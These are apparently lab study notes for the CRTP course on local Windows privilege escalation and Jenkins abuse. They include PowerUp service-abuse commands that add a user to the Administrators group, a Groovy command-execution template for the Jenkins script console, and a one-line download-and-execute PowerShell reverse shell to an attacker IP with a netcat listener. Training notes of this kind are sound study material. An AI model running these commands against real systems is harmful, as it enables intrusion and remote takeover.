---
title: "2 - Win Privesc"
classes: single
header:  
  teaser: /assets/images/posts/crtp/crtp-teaser3.jpg
  overlay_image: /assets/images/main/header1.jpg
  overlay_filter: 0.5
ribbon: Firebrick
excerpt: "Unquoted Paths and Modifiable Services"
description: "Unquoted Paths and Modifiable Services"
categories:
  - notes
  - crtp
tags:
  - beginner
  - AD
  - Windows 
toc: true
---


# Win Privesc - Local

> The material of CRTP about Local Privesc is not great

**There are various ways of locally escalating privileges on Windows box**:
```powershell
– Missing patches
– Automated deployment and AutoLogon passwords in clear text
– AlwaysInstallElevated (Any user can run MSI as SYSTEM)
– Misconfigured Services
– DLL Hijacking and more
– NTLM Relaying a.k.a. Won't Fix
```

**We can use below tools for complete coverage**:

[PowerSploit - Privesc Module](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)

[Privesc on GitHub](https://github.com/enjoiz/Privesc)

[winPEAS in PEASS-ng](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)


## Services Issues using PowerUp

**Get services with unquoted paths and a space in their name**:
```powershell
Get-ServiceUnquoted -Verbose
```

**Get services where the current user can write to its binary path or change arguments to the binary**:
```powershell
Get-ModifiableServiceFile -Verbose
```

**Get the services whose configuration current user can modify**:
```powershell
Get-ModifiableService -Verbose
```

**Run all checks with automated tools** :
```powershell
# PowerUp:
Invoke-AllChecks

# Privesc:
Invoke-PrivEsc

# PEASS-ng:
winPEASx64.exe
```

## Feature Abuse
```
- If you have Admin access (default installation before 2.x), go to http://<jenkins_server>/script
- In the script console, Groovy scripts could be executed.
```

```powershell
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = '
[INSERT COMMAND]'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```

If you don't have admin access but could add or edit build steps in the build configuration. Add a build step, add "Execute Windows Batch Command" and enter:
```powershell
powershell -c <command>
```

> Again, you could download and execute scripts, run encoded scripts and more.


**Learning Objective 5**:

- Exploit a service and elevate privileges to local administrator.
- Identify a machine in the domain where ur user has local administrative access.
- Using privileges of a user on Jenkins get admin privileges on another server.


**[easy to detect]**
```powershell
Invoke-ServiceAbuse -Name 'AbyssWebServer' -Username dcorp\studentx -Verbose
net localgroup Administrators
```

**[easy to detect - noise]**
```powershell
Find-PSRemotingLocalAdminAccess
```

```powershell
on Jenkins> powershell iex (iwr -UseBasicParsing http://172.16.100.1/Invoke-PowerShellTcp.ps1); power -Reverse -IPAddress 172.16.100.1 -Port 443
on Attacker> host the file in a webserver - example: HFS - HTTP File Server 
```

disable firewall or add exception
```powershell
on Attacker> netcat-win32-1.12.exe -lvp 443
```

